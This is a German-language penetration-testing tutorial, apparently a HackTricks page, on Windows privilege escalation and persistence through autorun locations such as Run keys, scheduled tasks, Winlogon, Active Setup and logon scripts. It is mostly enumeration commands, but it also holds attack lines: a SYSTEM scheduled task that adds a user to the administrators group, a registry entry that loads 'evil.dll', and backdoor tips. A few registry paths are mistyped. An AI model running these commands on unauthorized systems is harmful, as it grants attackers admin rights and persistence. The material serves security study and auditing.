# Privilege Escalation mit Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kann verwendet werden, um Programme beim **Systemstart** auszuführen. Mit folgendem Befehl lässt sich anzeigen, welche Binaries für die Ausführung beim Systemstart programmiert sind:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geplante Tasks

**Tasks** können so geplant werden, dass sie mit einer **bestimmten Häufigkeit** ausgeführt werden. Siehe, welche Binärdateien für die Ausführung geplant sind:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Ordner

Alle Binärdateien in den **Startup-Ordnern werden beim Systemstart ausgeführt**. Die gängigen Startup-Ordner sind im Folgenden aufgeführt, aber der Startup-Ordner wird in der Registry angegeben. [Hier erfahren Sie, wo.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **Hinweis**: Archive extraction *path traversal*-Schwachstellen (wie die in WinRAR vor 7.13 ausgenutzte – CVE-2025-8088) können dazu verwendet werden, **Payloads während der Dekomprimierung direkt in diesen Startup folders abzulegen**, wodurch beim nächsten Benutzer-Login Codeausführung ermöglicht wird. Eine ausführliche Analyse dieser Technik findest du hier:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Hinweis von hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der **Wow6432Node**-Registry-Eintrag zeigt an, dass du eine 64-Bit-Windows-Version verwendest. Das Betriebssystem nutzt diesen Schlüssel, um eine separate Ansicht von HKEY_LOCAL_MACHINE\SOFTWARE für 32-Bit-Anwendungen bereitzustellen, die auf 64-Bit-Windows-Versionen ausgeführt werden.

### Runs

**Häufig bekannte** AutoRun-Registry-Einträge:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry-Schlüssel namens **Run** und **RunOnce** sind dafür vorgesehen, bei jeder Anmeldung eines Benutzers am System automatisch Programme auszuführen. Die einer Schlüsselwert-Dateneintragung zugewiesene Befehlszeile ist auf maximal 260 Zeichen begrenzt.<sup>[[2]](#references)</sup>

**Service runs** (können den automatischen Start von Services während des Bootvorgangs steuern):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Unter Windows Vista und späteren Versionen werden die Registry-Schlüssel **Run** und **RunOnce** nicht automatisch erstellt. Einträge in diesen Schlüsseln können Programme entweder direkt starten oder sie als Abhängigkeiten angeben. Um beispielsweise beim Login eine DLL-Datei zu laden, könnte man den Registry-Schlüssel **RunOnceEx** zusammen mit einem „Depend“-Schlüssel verwenden. Dies wird demonstriert, indem ein Registry-Eintrag hinzugefügt wird, der während des Systemstarts „C:\temp\evil.dll“ ausführt:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Wenn du in einen der genannten Registryschlüssel innerhalb von **HKLM** schreiben kannst, kannst du deine Privilegien eskalieren, sobald sich ein anderer Benutzer anmeldet.

> [!TIP]
> **Exploit 2**: Wenn du eine der in einem der Registryschlüssel innerhalb von **HKLM** angegebenen Binärdateien überschreiben kannst, kannst du diese Binärdatei beim Anmelden eines anderen Benutzers mit einer Backdoor versehen und deine Privilegien eskalieren.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup-Pfad

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen, die im **Startup**-Ordner abgelegt werden, lösen automatisch den Start von Diensten oder Anwendungen während der Benutzeranmeldung oder beim Neustart des Systems aus. Der Speicherort des **Startup**-Ordners ist in der Registry sowohl für den Bereich **Local Machine** als auch für **Current User** definiert. Das bedeutet, dass jede Verknüpfung, die zu diesen angegebenen **Startup**-Speicherorten hinzugefügt wird, sicherstellt, dass der verknüpfte Dienst oder das Programm nach der Anmeldung oder dem Neustart gestartet wird. Dies ist eine unkomplizierte Methode, um die automatische Ausführung von Programmen zu planen.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Wenn du einen beliebigen \[User] Shell Folder unter **HKLM** überschreiben kannst, bist du in der Lage, ihn auf einen von dir kontrollierten Ordner zu verweisen und dort eine backdoor zu platzieren, die jedes Mal ausgeführt wird, wenn sich ein Benutzer am System anmeldet, wodurch du deine Privilegien eskalierst.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Dieser Registry-Wert pro Benutzer kann auf ein Script oder einen Befehl verweisen, der ausgeführt wird, wenn sich der betreffende Benutzer anmeldet. Er dient hauptsächlich als **persistence**-Primitive, da er nur im Kontext des betroffenen Benutzers ausgeführt wird. Dennoch sollte er bei Post-Exploitation- und Autoruns-Überprüfungen kontrolliert werden.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Wenn du diesen Wert für den aktuellen Benutzer beschreiben kannst, kannst du die Ausführung bei der nächsten interaktiven Anmeldung erneut auslösen, ohne Administratorrechte zu benötigen. Wenn du ihn für die Registry-Hive eines anderen Benutzers beschreiben kannst, erhältst du möglicherweise Code execution, wenn sich dieser Benutzer anmeldet.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Hinweise:

- Bevorzuge vollständige Pfade zu `.bat`-, `.cmd`-, `.ps1`- oder anderen Launcher-Dateien, die für den Zielbenutzer bereits lesbar sind.
- Dies bleibt bis zum Entfernen des Werts auch nach Abmeldung oder Neustart bestehen.
- Anders als `HKLM\...\Run` gewährt dies selbst keine erhöhten Rechte; es handelt sich um Persistenz im Benutzerkontext.

### Winlogon-Schlüssel

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typischerweise ist der **Userinit**-Schlüssel auf **userinit.exe** gesetzt. Wird dieser Schlüssel jedoch geändert, wird die angegebene ausführbare Datei bei der Benutzeranmeldung ebenfalls von **Winlogon** gestartet. Ebenso ist der **Shell**-Schlüssel für den Verweis auf **explorer.exe** vorgesehen, die standardmäßige Shell für Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Wenn du den Registry-Wert oder die Binary überschreiben kannst, kannst du deine Berechtigungen erhöhen.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Überprüfe den **Run**-Key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Ändern der Eingabeaufforderung im abgesicherten Modus

In der Windows-Registrierung unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` gibt es standardmäßig einen auf `cmd.exe` gesetzten **`AlternateShell`**-Wert. Das bedeutet, dass `cmd.exe` verwendet wird, wenn Sie beim Start „Safe Mode with Command Prompt“ auswählen (durch Drücken von F8). Es ist jedoch möglich, den Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne dass F8 gedrückt und die Option manuell ausgewählt werden muss.

Schritte zum Erstellen einer Bootoption für den automatischen Start im „Safe Mode with Command Prompt“:<sup>[[5]](#references)</sup>

1. Ändern Sie die Attribute der Datei `boot.ini`, um die Flags für Schreibschutz, System und Versteckt zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffnen Sie `boot.ini` zur Bearbeitung.
3. Fügen Sie eine Zeile wie diese ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichern Sie die Änderungen an `boot.ini`.
5. Weisen Sie der Datei wieder die ursprünglichen Attribute zu: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Das Ändern des **AlternateShell**-Registrierungsschlüssels ermöglicht die Einrichtung einer benutzerdefinierten Command Shell und kann potenziell für unbefugten Zugriff verwendet werden.
- **Exploit 2 (PATH-Schreibberechtigungen):** Schreibberechtigungen für einen beliebigen Teil der Systemvariablen **PATH**, insbesondere vor `C:\Windows\system32`, ermöglichen die Ausführung einer benutzerdefinierten `cmd.exe`, die als Backdoor dienen könnte, wenn das System im Safe Mode gestartet wird.
- **Exploit 3 (PATH- und boot.ini-Schreibberechtigungen):** Schreibzugriff auf `boot.ini` ermöglicht den automatischen Start im Safe Mode und erleichtert unbefugten Zugriff beim nächsten Reboot.

Um die aktuelle Einstellung von **AlternateShell** zu überprüfen, verwenden Sie diese Befehle:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installierte Komponente

Active Setup ist ein Feature in Windows, das **gestartet wird, bevor die Desktop-Umgebung vollständig geladen ist**. Es priorisiert die Ausführung bestimmter Befehle, die abgeschlossen sein müssen, bevor die Benutzeranmeldung fortgesetzt wird. Dieser Prozess findet sogar vor der Ausführung anderer Starteinträge statt, etwa solcher in den Registrierungsschlüsseln Run oder RunOnce.

Active Setup wird über die folgenden Registrierungsschlüssel verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Innerhalb dieser Schlüssel existieren verschiedene Unterschlüssel, die jeweils einer bestimmten Komponente entsprechen. Besonders interessante Schlüsselwerte sind:

- **IsInstalled:**
- `0` bedeutet, dass der Befehl der Komponente nicht ausgeführt wird.
- `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird. Dies ist das Standardverhalten, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Definiert den von Active Setup auszuführenden Befehl. Dies kann jede gültige Befehlszeile sein, beispielsweise das Starten von `notepad`.

**Sicherheitsaspekte:**

- Das Ändern oder Schreiben in einen Schlüssel, bei dem **`IsInstalled`** auf `"1"` gesetzt ist und ein bestimmter **`StubPath`** vorhanden ist, kann zur unbefugten Befehlsausführung führen und möglicherweise eine Privilege Escalation ermöglichen.
- Auch das Ändern der Binärdatei, auf die ein beliebiger **`StubPath`**-Wert verweist, könnte bei ausreichenden Berechtigungen eine Privilege Escalation ermöglichen.

Um die **`StubPath`**-Konfigurationen aller Active-Setup-Komponenten zu untersuchen, können die folgenden Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Überblick über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die Microsoft's Internet Explorer zusätzliche Funktionen hinzufügen. Sie werden bei jedem Start in Internet Explorer und Windows Explorer geladen. Ihre Ausführung kann jedoch durch das Setzen des Schlüssels **NoExplorer** auf 1 blockiert werden, wodurch verhindert wird, dass sie mit Windows-Explorer-Instanzen geladen werden.<sup>[[1]](#references)</sup>

BHOs sind über Internet Explorer 11 mit Windows 10 kompatibel, werden jedoch in Microsoft Edge, dem Standardbrowser neuerer Windows-Versionen, nicht unterstützt.

Um auf einem System registrierte BHOs zu untersuchen, können Sie die folgenden Registry-Schlüssel prüfen:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jedes BHO wird in der Registry durch seine **CLSID** dargestellt, die als eindeutige Kennung dient. Detaillierte Informationen zu jeder CLSID finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Für das Abfragen von BHOs in der Registry können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet-Explorer-Erweiterungen

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachte, dass die Registry für jede DLL einen neuen Registry-Eintrag enthält, der durch die **CLSID** dargestellt wird. Die CLSID-Informationen findest du unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Schriftarttreiber

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open-Befehl

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Beachte, dass alle Orte, an denen du autoruns finden kannst, bereits von [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **durchsucht werden**. Für eine **umfassendere Liste automatisch ausgeführter** Dateien kannst du jedoch [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)von SysInternals verwenden:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mehr

**Weitere Autoruns wie Registrierungen finden Sie unter** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Referenzen

- [1] [Häufige Persistence-Mechanismen von Malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart-Kategorien (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Wie kann ich eine Boot-Option hinzufügen, die eine alternative Shell startet?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
